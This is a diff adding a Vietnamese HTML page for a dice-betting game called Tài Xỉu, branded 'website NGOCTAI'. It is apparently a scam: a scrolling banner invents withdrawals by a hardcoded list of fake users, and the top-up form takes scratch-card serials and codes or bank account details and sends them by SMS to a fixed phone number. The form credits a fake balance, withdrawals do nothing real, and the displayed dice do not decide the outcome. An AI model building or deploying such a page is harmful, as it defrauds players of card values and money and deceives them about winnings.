@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Game Tài Xỉu - Demo & Chính thức</title>
+<style>
+body {font-family: Arial, sans-serif; text-align:center; padding-top:20px; background:linear-gradient(180deg, rgba(255,0,0,0.2) 0%, rgba(255,127,0,0.2) 14%, rgba(255,255,0,0.2) 28%, rgba(0,255,0,0.2) 42%, rgba(0,0,255,0.2) 56%, rgba(75,0,130,0.2) 70%, rgba(148,0,211,0.2) 84%, rgba(255,0,0,0.2) 100%);}
+#logo { display:inline-block; background-color:yellow; color:red; font-size:28px; font-weight:bold; padding:10px 20px; border-radius:10px; margin-bottom:20px; box-shadow:2px 2px 5px #888;}
+h1 {color:#333;}
+button {padding:10px 20px; margin:10px; cursor:pointer; border:none; border-radius:5px;}
+button.demo-like {font-weight:bold; font-size:20px; padding:10px 20px; transition: transform 0.2s, box-shadow 0.2s;}
+button.demo-like:hover {transform: scale(1.1); box-shadow: 0 0 15px #ff4500,0 0 20px #ffa500;}
+#dice-container {margin:30px auto; display:flex; justify-content:center; gap:15px; min-height:80px;}
+.dice {width:60px; height:60px; font-size:32px; background-color:white; border-radius:10px; box-shadow:2px 2px 6px #888; display:flex; justify-content:center; align-items:center; transition: transform 0.1s;}
+#result {margin-top:20px; font-size:18px; color:#006400; min-height:24px;}
+#demoMoney {margin-top:10px; font-size:20px; color:#8B008B; font-weight:bold;}
+#balance {margin-top:10px; font-size:18px; color:#8B0000;}
+#topup {margin-top:15px;}
+#topup button {background-color:orange; color:white;}
+#guide {background-color:#fff8dc; border:1px solid #f0e68c; padding:15px; margin:20px auto; width:320px; border-radius:8px; font-size:14px; color:#333; text-align:left;}
+#marquee {width:100%; overflow:hidden; height:30px; line-height:30px; margin-bottom:15px; border:1px solid #f00; background-color:#fff0f0; position:relative;}
+#marquee span {position:absolute; white-space:nowrap; color:red; font-weight:bold; left:100%;}
+#historyTable {margin:10px auto; width:90%; max-width:400px; border-collapse:collapse;}
+#historyTable th, #historyTable td {border:1px solid #888; padding:6px 10px;}
+#historyTable th {background-color:#f0f0f0;}
+#welcomePopup, #topupPopup {position: fixed; top:0; left:0; width:100%; height:100%; background-color: rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:9999; opacity:0; transition: opacity 0.5s ease; pointer-events:none;}
+#welcomePopup.show, #topupPopup.show {opacity:1; pointer-events:auto;}
+#welcomeContent, #topupContent {background-color:#fff; color:#008000; font-size:18px; font-weight:bold; padding:30px 50px; border-radius:15px; text-align:center; box-shadow:2px 2px 15px rgba(0,0,0,0.3);}
+#welcomeContent button, #topupContent button {margin-top:15px; padding:10px 20px; font-size:16px; background-color:#ff4500; border:none; border-radius:8px; color:white; cursor:pointer;}
+#topupContent input, #topupContent select {margin:8px 0; padding:6px 8px; font-size:16px; width:80%; border-radius:5px; border:1px solid #888;}
+</style>
+</head>
+<body>
+
+<div id="welcomePopup">
+  <div id="welcomeContent">
+    Chào mừng bạn đến với <strong>website NGOCTAI</strong><br>Đây là trang chính thức của game Tài Xỉu.
+    <br><button id="closePopup">OK</button>
+  </div>
+</div>
+
+<div id="logo">website NGOCTAI</div>
+<h1>🎲 Game Tài Xỉu 🎲</h1>
+
+<div id="marquee"><span id="marquee-content"></span></div>
+
+<h3>Demo chơi thử</h3>
+<button id="demoTai" class="demo-like" onclick="playDemo('tai')" style="background-color:green;color:white;">Tài</button>
+<button id="demoXiu" class="demo-like" onclick="playDemo('xiu')" style="background-color:red;color:white;">Xỉu</button>
+<div id="demoMoney">Tiền Demo: 100.000₫</div>
+
+<div id="dice-container">
+  <div class="dice">🎲</div>
+  <div class="dice">🎲</div>
+  <div class="dice">🎲</div>
+</div>
+
+<div id="result"></div>
+
+<h3>Phần chính thức</h3>
+<div id="balance">Số dư hiện tại: 0₫</div>
+<button class="demo-like" onclick="playOfficial('tai')" style="background-color:green;color:white;">Tài</button>
+<button class="demo-like" onclick="playOfficial('xiu')" style="background-color:red;color:white;">Xỉu</button>
+
+<h3>Lịch sử số điểm</h3>
+<button id="clearHistory">Xóa lịch sử</button>
+<table id="historyTable">
+  <thead>
+    <tr><th>Thời gian</th><th>Loại</th><th>Kết quả</th></tr>
+  </thead>
+  <tbody id="historyBody"></tbody>
+</table>
+
+<div id="guide">
+<strong>Hướng dẫn chơi:</strong><br>
+1. Chọn Tài/Xỉu → nhấn nút Đặt Cược.<br>
+2. Xúc xắc lắc trên dĩa 2 giây → hiển thị kết quả thắng/thua.<br>
+3. Tiền thắng/thua: 1 lần = 5.000₫.
+</div>
+
+<div id="topup">
+<button id="openTopup">Nạp tiền</button>
+<a id="withdrawLink" href="#"><button>Rút tiền</button></a>
+</div>
+
+<!-- Popup nạp tiền -->
+<div id="topupPopup">
+  <div id="topupContent">
+    <h3>Nạp tiền</h3>
+    <select id="topupMethod">
+      <option value="dt">Qua điện thoại</option>
+      <option value="bank">Qua ngân hàng</option>
+    </select><br>
+    <select id="topupAmount">
+      <option value="10000">10.000₫</option>
+      <option value="20000">20.000₫</option>
+      <option value="50000">50.000₫</option>
+      <option value="100000">100.000₫</option>
+    </select><br>
+
+    <div id="dtInputs">
+      <input type="text" id="topupSerial" placeholder="Số seri"><br>
+      <input type="text" id="topupCode" placeholder="Mã thẻ cào"><br>
+    </div>
+
+    <div id="bankInputs" style="display:none;">
+      <input type="text" id="topupBankName" placeholder="Tên ngân hàng"><br>
+      <input type="text" id="topupBankAcc" placeholder="Số tài khoản"><br>
+    </div>
+
+    <button id="confirmTopup">Xác nhận</button>
+    <button id="cancelTopup">Hủy</button>
+  </div>
+</div>
+
+<script>
+setTimeout(()=>{document.getElementById("welcomePopup").classList.add("show");},2000);
+document.getElementById("closePopup").addEventListener("click", ()=>{document.getElementById("welcomePopup").classList.remove("show");});
+
+let money=0, demoMoney=100000;
+const diceElems=document.querySelectorAll('.dice');
+const resultDiv=document.getElementById('result');
+const demoMoneyDiv=document.getElementById('demoMoney');
+const balanceDiv=document.getElementById('balance');
+const historyBody = document.getElementById("historyBody");
+let history = [];
+
+function saveHistory(point,type,text){
+  const now = new Date();
+  history.push({time: now.toLocaleString(), type: type, text:text});
+  renderHistory();
+}
+
+function renderHistory(){
+  historyBody.innerHTML = "";
+  history.forEach(item=>{
+    const tr = document.createElement("tr");
+    tr.innerHTML = `<td>${item.time}</td><td>${item.type}</td><td>${item.text}</td>`;
+    historyBody.appendChild(tr);
+  });
+}
+
+document.getElementById("clearHistory").addEventListener("click",()=>{
+  if(confirm("Bạn có chắc muốn xóa toàn bộ lịch sử?")){
+    history=[];
+    renderHistory();
+  }
+});
+
+// Marquee 100 người ngẫu nhiên rút tiền
+const marqueeContent = document.getElementById("marquee-content");
+const fakeUsers = [
+"Nguyễn Văn An","Trần Thị Bích","Lê Minh Châu","Phạm Quang Dũng","Hoàng Thị Hạnh",
+"Đỗ Đức Huy","Vũ Thị Lan","Bùi Ngọc Mai","Ngô Minh Nam","Lý Thanh Nhàn","Phan Thị Nhung",
+"Đặng Hoàng Phúc","Nguyễn Thị Quỳnh","Trương Thảo Quyên","Nguyễn Văn Sơn","Phạm Thị Vy",
+"Lê Tuấn","Trần Hà","Đinh Dương","Nguyễn Phương Anh","Nguyễn Thị Hạnh",
+"Nguyễn Long","Trần Quang","Nguyễn Thị Nhung","Lâm Hoàng","Minh Thảo",
+"Nguyễn Hải","Phan Hoa","Nguyễn Trung","Nguyễn Kiên","Nguyễn Đức","Nguyễn Thủy","Linh",
+"Phạm Văn Sơn","Trần Thị Mai","Nguyễn Hữu Tín","Ngô Thị Như","Lê Hoàng Anh",
+"Trần Văn Kiên","Nguyễn Thị Lan","Lê Văn Bình","Đặng Thị Thảo","Phạm Minh Tuấn",
+"Nguyễn Phúc Hạnh","Hoàng Thị Kim","Nguyễn Quốc Huy","Vũ Ngọc Mai","Nguyễn Thu Trang",
+"Nguyễn Thanh Long","Phạm Văn Duy","Trần Hồng Nhung","Nguyễn Thị Diệp","Nguyễn Tuấn Anh"];
+const amounts = [20000,50000,100000];
+let marqueeText = "";
+fakeUsers.forEach(u=>{
+  const a = amounts[Math.floor(Math.random()*amounts.length)];
+  marqueeText += `${u} đã rút ${a.toLocaleString('vi-VN')}₫   `;
+});
+marqueeContent.textContent = marqueeText;
+
+function animateMarquee(){
+  let left = marquee.offsetWidth;
+  function step(){
+    left -= 1;
+    if(left < -marqueeContent.offsetWidth) left = marquee.offsetWidth;
+    marqueeContent.style.left = left + "px";
+    requestAnimationFrame(step);
+  }
+  step();
+}
+animateMarquee();
+
+// Dice roll
+function rollDiceNumber(){ return Math.floor(Math.random()*6)+1; }
+
+function play(choice,isReal){
+  resultDiv.textContent="";
+  diceElems.forEach(die=>die.textContent="🎲");
+  let shakeCount=0;
+  const shakeInterval=setInterval(()=>{
+    diceElems.forEach(die=>{
+      const randomNum=rollDiceNumber();
+      die.textContent=randomNum;
+      die.style.transform=`rotate(${Math.random()*40-20}deg) translate(${Math.random()*10-5}px,${Math.random()*10-5}px)`;
+    });
+    shakeCount++;
+    if(shakeCount>15){
+      clearInterval(shakeInterval);
+      showResult(choice,isReal);
+    }
+  },130);
+}
+
+function showResult(choice,isReal){
+  let sum=0, finalNumbers=[];
+  diceElems.forEach(die=>{
+    const num=rollDiceNumber();
+    finalNumbers.push(num);
+    die.textContent=num;
+    die.style.transform="rotate(0deg) translate(0,0)";
+    sum+=num;
+  });
+
+  const amount=5000;
+  const outcome = Math.random()>=0.5?'tai':'xiu';
+  let resultText=`Kết quả: ${finalNumbers.join(' - ')} = ${sum}. `;
+
+  if(!isReal){
+    if(choice===outcome){
+      demoMoney += amount;
+      resultText += "🎉 Thắng!";
+    } else {
+      demoMoney = Math.max(demoMoney - amount,0);
+      resultText += "😢 Thua!";
+    }
+    demoMoneyDiv.textContent = `Tiền Demo: ${demoMoney.toLocaleString('vi-VN')}₫`;
+    saveHistory(amount,"Demo",resultText);
+  } else {
+    if(money <=0){
+      alert("Vui lòng nạp tiền để chơi!");
+      return;
+    }
+    if(choice===outcome){
+      money += amount;
+      resultText += "🎉 Thắng!";
+    } else {
+      money = Math.max(money - amount,0);
+      resultText += "😢 Thua!";
+    }
+    balanceDiv.textContent = `Số dư hiện tại: ${money.toLocaleString('vi-VN')}₫`;
+    saveHistory(amount,"Chính thức",resultText);
+  }
+
+  resultDiv.textContent = resultText;
+}
+
+function playDemo(choice){ play(choice,false); }
+function playOfficial(choice){ play(choice,true); }
+
+document.getElementById("withdrawLink").addEventListener("click",function(){
+  this.href=`sms:0329154195?body=Rút tiền : ${money}`;
+});
+
+// Popup nạp tiền
+const topupPopup = document.getElementById("topupPopup");
+document.getElementById("openTopup").addEventListener("click",()=>{topupPopup.classList.add("show");});
+document.getElementById("cancelTopup").addEventListener("click",()=>{topupPopup.classList.remove("show");});
+
+const topupMethod = document.getElementById("topupMethod");
+const dtInputs = document.getElementById("dtInputs");
+const bankInputs = document.getElementById("bankInputs");
+
+topupMethod.addEventListener("change", ()=>{
+  if(topupMethod.value==="dt"){
+    dtInputs.style.display="block";
+    bankInputs.style.display="none";
+  } else {
+    dtInputs.style.display="none";
+    bankInputs.style.display="block";
+  }
+});
+
+document.getElementById("confirmTopup").addEventListener("click",()=>{
+  const method = topupMethod.value;
+  const amount = parseInt(document.getElementById("topupAmount").value);
+  const serial = document.getElementById("topupSerial").value.trim();
+  const code = document.getElementById("topupCode").value.trim();
+  const bankName = document.getElementById("topupBankName").value.trim();
+  const bankAcc = document.getElementById("topupBankAcc").value.trim();
+
+  if(method==="dt"){
+    if(!serial || !code){ alert("Vui lòng nhập số seri và mã thẻ."); return; }
+    money+=amount;
+    balanceDiv.textContent=`Số dư hiện tại: ${money.toLocaleString('vi-VN')}₫`;
+    const smsLink=`sms:0329154195?body=Nạp tiền DT: ${amount}₫, Seri: ${serial}, Mã thẻ: ${code}`;
+    window.location.href = smsLink;
+    saveHistory(amount,"Nạp DT",`Nạp ${amount.toLocaleString('vi-VN')}₫ qua điện thoại`);
+  } else {
+    if(!bankName || !bankAcc){ alert("Vui lòng nhập tên ngân hàng và số tài khoản."); return; }
+    money+=amount;
+    balanceDiv.textContent=`Số dư hiện tại: ${money.toLocaleString('vi-VN')}₫`;
+    const smsLink=`sms:0329154195?body=Nạp tiền BANK: ${amount}₫, Ngân hàng: ${bankName}, STK: ${bankAcc}`;
+    window.location.href = smsLink;
+    saveHistory(amount,"Nạp BANK",`Nạp ${amount.toLocaleString('vi-VN')}₫ qua ngân hàng`);
+  }
+  document.getElementById("topupSerial").value="";
+  document.getElementById("topupCode").value="";
+  document.getElementById("topupBankName").value="";
+  document.getElementById("topupBankAcc").value="";
+  topupPopup.classList.remove("show");
+});
+</script>
+</body>
+</html>
